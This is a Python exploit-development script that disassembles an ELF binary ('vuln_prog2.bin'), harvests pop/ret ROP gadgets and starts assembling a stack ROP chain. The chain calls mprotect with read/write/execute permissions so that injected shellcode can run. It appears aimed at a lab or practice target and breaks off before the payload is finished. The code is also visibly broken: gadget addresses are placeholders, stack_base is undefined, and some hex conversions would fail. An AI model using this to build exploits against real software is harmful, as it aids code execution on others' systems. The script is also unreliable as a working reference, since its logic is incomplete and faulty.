# disas.py

from capstone import *
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
filename= './vuln_prog2.bin'
disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
with open(filename, 'rb') as file:
        elf = ELFFile(file)
        code = elf.get_section_by_name('.text')
        ops = code.data() # type bytes
        # ops2 = ops[-15:]
        addr = code['sh_addr'] # type int
        md = Cs(CS_ARCH_X86, CS_MODE_64)

        # gets all instructions, intended or not

        while(ops != b""):
            for i in md.disasm(ops, addr):
                disas.append((i.address,i.mnemonic,i.op_str))
            addr += 1
            ops = ops[1:]

gadgets = []
gadgetIndex = 0
getOneRet = True
while gadgetIndex < len(disas):
        if ((disas[gadgetIndex][1] == 'ret') and getOneRet):
                gadgets.append((disas[gadgetIndex],))
                getOneRet = False
        if (disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'ret'):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4]))
        if ((disas[gadgetIndex][1] == 'pop') and (disas[gadgetIndex+1][1] == 'pop') and (disas[gadgetIndex+2][1] == 'pop') and (disas[gadgetIndex+3][1] == 'pop') and (disas[gadgetIndex+4][1] == 'pop') and (disas[gadgetIndex+5][1] == 'ret')):
                gadgets.append((disas[gadgetIndex],disas[gadgetIndex+1],disas[gadgetIndex+2],disas[gadgetIndex+3],disas[gadgetIndex+4],disas[gadgetIndex+5]))


        gadgetIndex = gadgetIndex + 1

#remove duplicates
gadgets.sort()
gadgetIndex = 1
while gadgetIndex < len(gadgets):
        #if lengths are different, gadgets must be different
        if len(gadgets[gadgetIndex]) != len(gadgets[gadgetIndex-1]):
                gadgetIndex+=1
                continue
        gadgetIndex2 = 0
        broke = False
        while gadgetIndex2 < (len(gadgets[gadgetIndex])-1):
                #if args of instructions are different, gadgets must be different
                if gadgets[gadgetIndex][gadgetIndex2][2] != gadgets[gadgetIndex-1][gadgetIndex2][2]:
                        gadgetIndex += 1
                        broke = True
                        break
                gadgetIndex2 += 1
        if(not broke):
                del gadgets[gadgetIndex]

print("Available Gadgets: ")
for i in gadgets:
        print(i)

shortest_rdi = 100
shortest_rsi = 100
shortest_rdx = 100

for x in range(0, len(gadgets)):
    if (gadgets[x][0][2] == "rdi") and (len(gadgets[x]) < shortest_rdi):
        shortest_rdi = len(gadgets[x])
    elif (gadgets[x][0][2] == "rsi") and (len(gadgets[x]) < shortest_rsi):
        shortest_rsi = len(gadgets[x])
    elif (gadgets[x][0][2] == "rdx") and (len(gadgets[x]) < shortest_rdx):
        shortest_rdx = len(gadgets[x])
    else:
        print("uhoh")

print(shortest_rdi)
print(shortest_rsi)
print(shortest_rdx)
heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
if heapOrStack == "S":
        baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine): ")
        gadget1addr = "0x0"
        gadget2addr = "0x0"
        gadget3addr = "0x0"

        gadget1 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget1addr, 16)))
        gadget1.reverse()
        gadget2 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget2addr, 16)))
        gadget2.reverse()
        gadget3 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget3addr, 16)))
        gadget3.reverse()

        arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
        arg_addr.reverse()

        arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t

        arg_prot = b"\x07"  # int, look at man pages (c-level flags)

        faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
        faddr_byte_array.reverse()

